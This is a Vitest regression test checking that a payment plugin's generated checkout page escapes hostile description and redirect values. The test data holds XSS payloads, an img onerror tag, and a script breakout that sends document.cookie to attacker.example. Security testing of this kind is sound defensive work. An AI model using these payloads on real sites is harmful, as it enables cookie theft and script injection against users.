import vm from 'node:vm'
import { expect, test } from 'vitest'

import { testProvider } from '../src/providers/test.js'

// Drives the test provider's checkout page with hostile description and redirectUrl
// values and checks they come out as data, not markup or code. Before the escaping
// fix, an apostrophe in redirectUrl was a SyntaxError in the inline script block,
// which silently disabled every click handler on the page; a description could
// inject executing tags. Run with: vitest run dev/test-provider-ui-escape.spec.ts
test('hostile description and redirectUrl are neutralised in the generated checkout page', async () => {
  const hostileDescription = `Bolts <3" & washers <img src=x onerror=alert(1)>`
  const hostileRedirect = `https://shop.example/thanks?note=it's-done';fetch('https://attacker.example/?c='+document.cookie);//</script><script>alert(2)</script>`

  const provider = testProvider({ enabled: true })!

  const payment: any = {
    amount: 1234,
    currency: 'eur',
    description: hostileDescription,
    redirectUrl: hostileRedirect,
  }
  // The test provider's initPayment never touches its payload argument, so none is needed;
  // it mutates `payment`, setting providerId, which keys the in-memory session.
  await provider.initPayment(null as any, payment)

  const config: any = { endpoints: [] }
  provider.onConfig!(config, {} as any)
  const uiEndpoint = config.endpoints.find((e: any) => e.path === '/payload-billing/test/payment/:id')
  const res: Response = await uiEndpoint.handler({ url: `/api/payload-billing/test/payment/${payment.providerId}` })
  const html = await res.text()

  // HTML sink: the hostile description must not appear as raw markup anywhere.
  expect(html).not.toContain('<img src=x')
  expect(html).toContain('Bolts &lt;3&quot; &amp; washers')

  // Script-block termination: a </script> inside a value must not open a new block.
  expect(html).not.toContain('<script>alert(2)')

  // JS sink: the single inline script block must parse.
  const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(m => m[1])
  expect(scripts).toHaveLength(1)
  expect(() => new vm.Script(scripts[0])).not.toThrow()

  // The values survive as data: double-quoted JSON strings inside the script.
  expect(scripts[0]).toContain(`window.location.href = "https://shop.example/thanks?note=it's-done`)
  expect(scripts[0]).toContain(`paymentId: "${payment.providerId}"`)
})
